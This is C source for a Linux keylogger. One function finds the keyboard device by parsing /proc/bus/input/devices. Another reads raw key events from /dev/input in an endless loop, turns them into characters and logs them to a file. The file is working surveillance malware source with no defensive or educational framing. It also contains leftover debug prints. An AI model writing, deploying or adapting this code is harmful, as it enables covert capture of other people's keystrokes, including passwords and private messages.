#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

#include "keylogger.h"

#define BUFFER_SIZE 512

void capture_keys(FILE *file, char *event)
{
	printf("a\n");
	fflush(stdout);

	struct input_event ev;

	char path[255] = "/dev/input/";

	strcat(path, event);

	printf("%s", path);
	fflush(stdout);

	int fd = open(path, O_RDONLY);

	char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./... ";

	while (1)
	{

		int r = read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			if (ev.code == 28)
				fprintf(file, "\n");
			if (ev.code == 14)
				fprintf(file, "<=");
			else
			{

				fprintf(file, "%c", map[ev.code]);
			}
			fflush(file);
		}
	}

	close(fd);
}

char *find_keyboard()
{
	FILE *ptr;
	char line[BUFFER_SIZE];
	char *handlers_line;
	char *event;
	int i = -1;

	ptr = fopen("/proc/bus/input/devices", "r");

	while (fgets(line, BUFFER_SIZE, ptr))
	{

		if (i == 1)
		{

			if (strstr(line, "EV=120013") != NULL)
			{
				break;
			}
			else
			{
				i = -1;
			}
		}
		if (i == 2)
		{
			i--;
		}

		if (strstr(line, "Handlers") != NULL)
		{
			i = 2;
			handlers_line = strdup(line);
		}
	}
	fclose(ptr);

	event = strstr(handlers_line, "event");
	char *ans = strndup(event, 6);
	return ans;
}